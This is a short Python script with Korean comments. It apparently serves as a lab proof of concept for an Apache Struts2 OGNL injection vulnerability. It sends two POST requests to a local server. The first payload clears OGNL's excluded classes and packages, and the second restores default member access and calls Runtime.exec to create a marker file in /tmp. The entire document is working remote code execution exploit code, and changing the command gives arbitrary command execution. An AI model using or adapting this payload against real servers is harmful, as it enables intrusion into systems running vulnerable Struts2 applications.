import requests  # requests 모듈을 불러옴

url = "http://127.0.0.1:8080"  # 대상 웹 서버의 URL

# 첫 번째 공격 payload
# Struts2의 OGNL 표현식을 이용하여 웹 어플리케이션의 보안 설정을 바꾸려고 시도.
# 특히, 실행될 클래스와 패키지의 제한을 제거하려고 시도.
data1 = {
    "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
}

# 두 번째 공격 payload
# 첫 번째 payload에서의 보안 설정 변경 후, 서버 내에서 외부 명령을 실행하려고 시도.
# 'touch /tmp/successbywhs1hyeongyu' 명령을 사용하여 서버 내 '/tmp' 디렉터리에 파일을 생성.
data2 = {
    "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/successbywhs1hyeongyu'))}"
}

# 첫 번째 공격 payload를 사용하여 POST 요청을 전송
res1 = requests.post(url, data=data1)

print(res1.text)

# 두 번째 공격 payload를 사용하여 POST 요청을 전송
res2 = requests.post(url, data=data2)

print(res2.text)
